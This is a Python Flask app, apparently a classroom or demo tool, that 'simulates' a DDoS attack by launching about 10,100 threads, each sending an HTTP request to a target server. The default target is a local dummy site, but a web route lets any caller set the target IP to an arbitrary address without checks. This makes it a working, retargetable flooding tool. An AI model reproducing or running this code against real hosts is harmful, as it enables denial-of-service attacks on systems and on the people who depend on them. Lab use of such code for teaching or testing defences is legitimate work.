from flask import Flask, render_template, request, jsonify
import threading
import requests
import time
from tqdm import tqdm

app = Flask(__name__)

# Global variables for target IP and port
target_ip = "127.0.0.2"  # Default to dummy_site
target_port = 5001       # Dummy site port

# Function to simulate sending requests to the target server
def send_requests(ip, port):
    url = f"http://{ip}:{port}/"
    headers = {"User-Agent": "Malicious-Attack"}
    try:
        requests.get(url, headers=headers)
    except requests.exceptions.RequestException:
        pass

# Function to simulate the DDoS attack
def simulate_attack():
    global target_ip, target_port
    threads = []

    print("\n[STEP 1] Initializing DDoS Attack Simulation...")
    time.sleep(2)
    print(f"[INFO] Target IP: {target_ip}")
    print(f"[INFO] Target Port: {target_port}")
    print("[INFO] Simulating malicious traffic...\n")
    time.sleep(2)

    for i in tqdm(range(1, 10100), desc="Simulating Traffic"):
        t = threading.Thread(target=send_requests, args=(target_ip, target_port))
        threads.append(t)
        t.start()

        if i % 13999 == 0:
            print(f"[INFO] {i} threads created. Target is receiving heavy traffic...")
            time.sleep(1)

    for t in threads:
        t.join()

    print("\n[STEP 2] Attack Simulation Complete.\n")

# Route to display the main page
@app.route("/")
def index():
    global target_ip, target_port
    return render_template("index.html", target_ip=target_ip, target_port=target_port)

# Route to update the target IP
@app.route("/set_target", methods=["POST"])
def set_target():
    global target_ip
    new_ip = request.form.get("target_ip")
    if new_ip:
        target_ip = new_ip
        return jsonify({"message": f"Target IP updated to {target_ip}"}), 200
    return jsonify({"message": "Invalid IP address"}), 400

# Route to start the DDoS attack
@app.route("/simulate", methods=["POST"])
def start_simulation():
    threading.Thread(target=simulate_attack).start()
    return jsonify({"message": "DDoS Attack Simulation Started. Check Terminal Output."}), 200

# Route to reset the dummy site server
@app.route("/reset", methods=["POST"])
def reset_server():
    global target_ip, target_port
    print("\n[STEP 1] Resetting Dummy Site Server...")
    url = f"http://{target_ip}:{target_port}/reset"
    try:
        response = requests.post(url)
        if response.status_code == 200:
            print("[INFO] Server reset successfully.")
        else:
            print("[ERROR] Server reset failed.")
    except requests.exceptions.RequestException:
        print("[ERROR] Unable to contact the dummy site.")
    time.sleep(2)
    return jsonify({"message": "Reset Command Sent. Check Terminal Output."}), 200

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
